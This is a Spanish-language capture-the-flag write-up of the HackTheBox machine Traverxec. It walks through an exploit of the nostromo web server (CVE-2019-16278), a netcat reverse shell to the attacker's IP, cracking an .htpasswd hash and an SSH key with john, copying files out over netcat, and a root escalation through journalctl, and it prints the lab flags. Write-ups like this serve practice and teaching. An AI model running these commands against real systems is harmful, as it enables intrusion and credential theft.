---
title: HackTheBox - Traverxec
author: cotes
date: 2023-09-06 17:51:00 +0800
categories: [Writeup, HackTheBox, Easy]
tags: [Linux, 'RCE (CVE-2019-16278)', 'Information Leakage', Misconfiguration]
math: true
mermaid: true
image:
  path: /assets/images/HTB/Easy/Traverxec/logo.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Traverxec Machine Logo
---

Máquina Linux de nivel **Easy** de HackThBox.

Técnicas usadas: **RCE (CVE-2019-16278), Information Leakage, Misconfiguration**

### Fase de Reconocimiento 🧣

a. Enumeramos los puertos que están abiertos en la **`Máquina Traverxec`**

* **`nmap -p- -sS -Pn -n <IP> -oG puertos`**

    ![](/assets/images/HTB/Easy/Traverxec/01-ports.png)

b. Vemos las versiones de los servicios que se están ejecutando en los puertos

* **`nmap -p22,80 -sCV <IP> -oN versiones`**

    ![](/assets/images/HTB/Easy/Traverxec/02-versions.png)



    * Al buscar por vulnerabilidades de **`nostromo 1.9.6`** encontramos [CVE-2019-16278](https://www.exploit-db.com/exploits/47837), con el cual logramos un **RCE (Remote Command Execution)**

    ```bash
    python2 nostromo_rce.py 10.10.10.165 80 'id'
    <SNIP>
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    ```

c. Como ya podemos ejecutar comandos entablamos una **`reverse shell`**, nos ponemos en escucha con **`nc`** previamente.

```bash
python2 nostromo_rce.py 10.10.10.165 80 'nc -e bash 10.10.14.115 443'
----------------------------------------------------------------------
nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.115] from (UNKNOWN) [10.10.10.165] 54542
script /dev/null -c bash
www-data@traverxec:/usr/bin$
```

### Escalada de Privilegios 💹

a. Existe **david** como usuario en el sistema

```bash
www-data@traverxec:/home$ ls 
david
```

b. Investigamos por archivos que tengan como propietario al usuario **www-data**

```bash
find / -user www-data 2>/dev/null | grep -vE "proc"

<SNIP>
/var/nostromo/logs
/var/nostromo/logs/nhttpd.pid
```

* En el directorio **/var/nostromo/conf** podemos ver archivos de configuración de **nostromo**

    * **nhttpd.conf**

        ```
        # MAIN [MANDATORY]
        servername              traverxec.htb
        serverlisten            *
        serveradmin             david@traverxec.htb
        serverroot              /var/nostromo
        servermimes             conf/mimes
        docroot                 /var/nostromo/htdocs
        docindex                index.html

        # LOGS [OPTIONAL]
        logpid                  logs/nhttpd.pid

        # SETUID [RECOMMENDED]
        user                    www-data

        # BASIC AUTHENTICATION [OPTIONAL]
        htaccess                .htaccess
        htpasswd                /var/nostromo/conf/.htpasswd

        # ALIASES [OPTIONAL]
        /icons                  /var/nostromo/icons

        # HOMEDIRS [OPTIONAL]
        homedirs                /home
        homedirs_public         public_www
        ```

        > Añadimos el dominio **traverxec.htb** a nuestro archivo **/etc/hosts**
        {: .prompt-info }

* En el archivo **.htpasswd** vemos la contraseña del usuario **david**

    ```bash
    www-data@traverxec:/var/nostromo/conf$ cat .htpasswd 
    david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
    ```
    > Al crackearla con **john** vemos que en texto plano es **`Nowonly4me`**

c. Si leemos un poco de documentación sobre [nostromo](https://www.gsp.com/cgi-bin/man.cgi?section=8&topic=NHTTPD), observamos que podemos acceder directorios de esta forma **`~[Directorio]`** y en caso de necesitar auntenticación debemos acceder a **.htaccess**

* Después de intentar de varias formas, ninguna funciona

    ```bash
    http://david:Nowonly4me@traverxec.htb/~david/
    http://traverxec.htb/~david/
    http://traverxec.htb/~david/.htaccess
    http://david:Nowonly4me@traverxec.htb/~david/.htaccess
    ```


    ![](/assets/images/HTB/Easy/Traverxec/03-message.png)

    > Mensaje de la página web.

d. En el archivo **nhttpd.conf** existe la configuración 

```bash
homedirs                /home
homedirs_public         public_www
```

* Esto nos indica que los directorios a los que podemos acceder con **nostromo** son todos los que están en **home** (Direcctorio del usuario **david**) y que tiene un directorio accesible **public_www**

    ```bash
    www-data@traverxec:/home$ cd david/public_www
    www-data@traverxec:/home/david/public_www$ ls
    index.html  protected-file-area
    www-data@traverxec:/home/david/public_www$ cd protected-file-area/
    www-data@traverxec:/home/david/public_www/protected-file-area$ ls
    backup-ssh-identity-files.tgz
    ```

e. Tranferimos el archivo **backup-ssh-identity-files.tgz** a nuestra **Máquina Atacante**

* **Máquina Atacante:** nc -lvnp 4444 > backup.tgz
* **Máquina Víctima:** nc <tun0 IP> 4444 < backup-ssh-identity-files.tgz

Descomprimos el fichero **tar -xzvf backup.tgz** y encontramos los pares de claves **RSA** del usuario **david**, pero la clave está encriptada, así que extraemos el **hash** con **`ssh2john id_rsa > hash`**

```bash
john hash -w=/home/kali/Desktop/rockyou.txt
id_rsa:hunter
```
> Contraseña en texto claro del fichero **id_rsa**

f. Nos autenticamos en el servicio **ssh** y vemos que tenemos un directorio **/bin**

```bash
david@traverxec:~/bin$ ls
server-stats.head  server-stats.sh
```

* **server-status.sh**

    ```bash
    <SNIP>
    /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
    ```
    > Tenemos permiso para ejecutar **journalctl** como **root**

g. Para "forzar" la paginación de **journalctl** y podemos ejecutar comandos tenemos que minizar el tamaño de nuestra terminal

![](/assets/images/HTB/Easy/Traverxec/04-binary.png)

Por último leemos las **flags**

```bash
root@traverxec:/home/david/bin# cat /root/root.txt 
304e9063bbeecd398b1e260aeb580033
root@traverxec:/home/david/bin# cat /home/david/user.txt 
8340b5984d36a505da9adc72f1681260
```